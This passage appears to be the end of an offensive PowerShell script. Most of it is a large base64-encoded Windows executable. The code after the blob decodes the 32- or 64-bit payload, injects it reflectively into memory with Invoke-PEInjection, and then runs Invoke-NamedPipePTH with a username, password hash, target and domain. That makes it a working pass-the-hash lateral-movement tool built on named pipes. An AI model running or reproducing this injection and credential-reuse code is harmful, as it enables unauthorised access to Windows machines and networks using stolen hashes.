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N9A34jcqOEM4xzjcOOU47jgEOeY57DnxOfg5CDoWOic6PzpFOlE6cDp2Org9Zj4FPwAAADABAJwAAAAFMCkwLjB5MIEwiTCRMJkwtzC/MCExLTFBMU0xWTF5McAx6jHyMQ8yHzIrMjoyTTN+M8Az9zMUNCg0MzSANAk1TDV+NeY1Zjb2NhY3Jjd7N3w4jDidOKU4tTjGOC05ODk+OUc5gTmQOZw5qzm+Od05CDojOmw6dTp+Ooc6sjrUOvg6ajtqPMk8JD2SPbE94j00PwAAAEABAEQAAABuMIkwnzC1ML0wITQpNTo1ujcWOBs4LThLOF84ZTgPOWQ5mzmiPRE+Ij4zPl0+tz7SPm4/gj+TP8E/AAAAUAEAGAAAAC0wRjCCMcgyeDP+Mys0AAAAYAEASAEAAKgxsDG8McAxxDHIMcwx2DHcMeAx8DH0MfgxADIIMhAyGDIgMigyMDI4MkAySDJQMlgyYDJoMnAyeDKAMogykDKYMqAyqDKwMrgywDLIMtAy2DLgMugy8DL4MgAzCDMQMxgzIDMoMzAzODNAM0gzUDNYM2AzaDNwM3gzgDOIM5AzmDOgM6gzsDO4M8AzyDPQM9gz4DPoM/Az+DMANAg0EDQYNCA0KDQwNDg0QDRINFA0WDRgNGg0cDR4NIA0iDSQNJg0oDSoNLA0uDTANMg00DTYNOA06DTwNPg0ADUINRA1GDUgNSg1MDU4NUA1SDVQNVg1YDVoNXA1eDWgO6Q7qDu4PLw8wDzYPNw84Dw4PkA+SD5MPlA+VD5YPlw+YD5kPmw+cD50Png+fD6APoQ+iD6UPpw+pD6oPqw+sD60PgAAAHABAAgBAAAgMCQwKDAsMDAwNDA4MDwwQDBEMEgwTDBQMFQwWDBcMGAwZDBoMGwwYDVkNWg1bDVwNXQ1eDV8NYA1hDWINYw1kDWUNZg1nDXoNew18DX0Nfg1/DUANgQ2CDYMNhA2FDYYNhw2IDYkNig2LDYwNjQ2ODY8NkA2RDZINkw2UDZUNlg2XDZgNmQ2aDZsNnA2dDZ4Nnw2gDaENog2jDaQNpw2oDakNqg2rDawNrQ2uDa8NsA2xDbINsw20DbUNtg23DbgNuQ26DbsNvA29Db4Nvw2ADcENwg3DDcQNxQ3GDccNyA3JDcoNyw3MDc0Nzg3PDdAN0Q3SDeoOqw6sDq0OgAAAIABANABAAD8MgQzDDMUMxwzJDMsMzQzPDNEM0wzVDNcM2QzbDN0M3wzhDOMM5QznDOkM6wztDO8M8QzzDPUM9wz5DPsM/Qz/DMENAw0FDQcNCQ0LDQ0NDw0RDRMNFQ0XDRkNGw0dDR8NIQ0jDSUNJw0pDSsNLQ0vDTENMw01DTcNOQ07DT0NPw0BDUMNRQ1HDUkNSw1NDU8NUQ1TDVUNVw1ZDVsNXQ1fDWENYw1lDWcNaQ1rDW0Nbw1xDXMNdQ13DXkNew19DX8NQQ2DDYUNhw2JDYsNjQ2PDZENkw2VDZcNmQ2bDZ0Nnw2hDaMNpQ2nDakNqw2tDa8NsQ2zDbUNtw25DbsNvQ2/DYENww3FDccNyQ3LDc0Nzw3RDdMN1Q3XDdkN2w3dDd8N4Q3jDeUN5w3pDesN7Q3vDfEN8w31DfcN+Q37Df0N/w3BDgMOBQ4HDgkOCw4NDg8OEQ4TDhUOFw4ZDhsOHQ4fDiEOIw4lDicOKQ4rDi0OLw4xDjMONQ43DjkOOw49Dj8OAQ5DDkUORw5JDksOTQ5PDlEOUw5VDlcOWQ5bDl0OXw5hDmMOZQ5nDmkOaw5tDm8OcQ5zDnUOdw55DnsOfQ5/DkEOgw6FDoAkAEA0AEAABg0IDQoNDA0ODRANEg0UDRYNGA0aDRwNHg0gDSINJA0mDSgNKg0sDS4NMA0yDTQNNg04DToNPA0+DQANQg1EDUYNSA1KDUwNTg1QDVINVA1WDVgNWg1cDV4NYA1iDWQNZg1oDWoNbA1uDXANcg10DXYNeA16DXwNfg1ADYINhA2GDYgNig2MDY4NkA2SDZQNlg2YDZoNnA2eDaANog2kDaYNqA2qDawNrg2wDbINtA22DbgNug28Db4NgA3CDcQNxg3IDcoNzA3ODdAN0g3UDdYN2A3aDdwN3g3gDeIN5A3mDegN6g3sDe4N8A3yDfQN9g34DfoN/A3+DcAOAg4EDgYOCA4KDgwODg4QDhIOFA4WDhgOGg4cDh4OIA4iDiQOJg4oDioOLA4uDjAOMg40DjYOOA46DjwOPg4ADkIORA5GDkgOSg5MDk4OUA5SDlQOVg5YDloOXA5eDmAOYg5kDmYOaA5qDmwObg5wDnIOdA52DngOeg58Dn4OQA6CDoQOhg6IDooOjA6ODpAOkg6UDpYOmA6aDpwOng6gDqIOpA6mDqgOqg6sDq4OsA6yDrQOtg64DroOvA6+DoAOwg7EDsYOyA7KDswOwCgAQAQAAAAKj8uPzI/Nj8AsAEASAAAACw4NDg8OEQ4TDhUOFw4ZDhsOHQ4fDiEOIw4lDicOKQ4rDi0OLw4xDjMONQ43DjkOOw49Dj8OAQ5DDnIOcw5AAAAwAEAuAAAALwxwDHIMUQySDJYMlwyZDJ8MowykDKgMqQyqDKwMsgy2DLcMuwy8DL4MhAzIDZANlw2YDZ8NoA2nDagNsA2yDbMNug28Db0NgQ3KDc0Nzw3ZDdoN4Q3iDeQN5g3oDekN6w3wDfIN9w39Df4Nxg4ODhYOGA4bDigOMA44Dj8OAA5IDlAOWA5gDmgOcA54DkAOiA6QDpgOoA6oDrAOuA6ADsgO0A7XDtgO4A7oDu8O8A7AOABAEwAAAA4MWgxeDGIMZgxqDHAMcwx0DHUMfAx9DEgNyg3LDcwNzQ3ODc8N0A3RDdIN0w3WDdcN2A3ZDdoN2w3cDd0N8A44Dj8OAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="

 if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
 {
       [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($executable64)
 }
 else
 {
       [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($executable86)
 }

 Invoke-PEInjection -PEBytes $PEBytes -ExeArgs "-e $binary -p $PipeName"
 
 } -ArgumentList $binary,$Pipename
 Sleep 3

 Invoke-NamedPipePTH -Username $Username -Hash $Hash -Target $Target -Domain $domain -PipeName $PipeName
 }